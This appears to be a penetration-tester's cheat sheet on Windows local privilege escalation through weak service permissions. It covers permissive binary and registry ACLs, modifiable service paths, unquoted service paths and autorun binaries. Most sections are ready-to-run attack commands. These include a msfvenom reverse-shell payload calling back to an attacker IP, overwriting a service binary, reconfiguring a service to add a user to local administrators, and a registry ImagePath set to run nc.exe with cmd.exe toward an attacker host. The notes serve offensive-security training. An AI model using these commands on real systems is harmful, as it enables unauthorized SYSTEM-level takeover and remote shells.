# Weak Permissions

### Permissive ACLs

{% embed url="https://github.com/GhostPack/SharpUp/" %}

```shellscript
# Check for any modifiable service binary 
# Look for === Modifiable Service Binaries ===
.\SharpUp.exe audit

# Check permissions over the binary => look for Everyone (F) or BUILTIN\Users (F)
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Generate a msfvenom reverse shell 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.231 LPORT=4444 -f exe > SecurityService.exe

# Replace the binary 
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Start the service and receive the shell
sc.exe start SecurityService
```

### Weak service permissions

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" %}

```shellscript
# Check for modifiable binary path
# Look for === Modifiable Services ===
.\SharpUp.exe audit

# Check permissions => look for SERVICE_ALL_ACCESS over the service
accesschk.exe /accepteula -quvcw WindscribeService

# Change the binary service path to execute a command
sc.exe config WindscribeService binpath="cmd /c net localgroup administrators <USER> /add"

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > SecurityService.exe
sc.exe config WindscribeService binpath="cmd /c <PATH_TO_REV_SHELL>"

# Restart the service
sc.exe stop WindscribeService
sc.exe start WindscribeService

# Confirm our user is now part of local admins
net localgroup administrators
```

Cleanup

```shellscript
# Revert the binary path
sc.exe config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

# Start the service again
sc.exe start WindScribeService

# Verify it is now running 
sc.exe query WindScribeService
```

### Unquoted service path

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

* `C:\\Program`
* `C:\\Program Files`
* `C:\\Program Files (x86)\\System`
* `C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64`

If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\\SYSTEM`.

* `C:\\Program.exe\\`
* `C:\\Program Files (x86)\\System.exe`

However, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable.

```shellscript
# Query a service => we see that it is being executed as SYSTEM
sc qc <SERVICE>

# Search for unquoted path binaries
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Permissive Registry ACLs

```shellscript
# Checking for Weak Service ACLs in Registry => look for KEY_ALL_ACCESS
accesschk.exe /accepteula "<USER>" -kvuqsw hklm\System\CurrentControlSet\services

# Changing ImagePath with PowerShell => we could also pass the path to a msfvenom revshell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "<PATH_TO_NC.EXE> -e cmd.exe <IP> <PORT>"

# The payload will be executed when the system restarts
```

### Modifiable Registry Autorun Binary

We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

{% embed url="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html" %}

```shellscript
# Check startup programs
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

# Then look at the link above
```
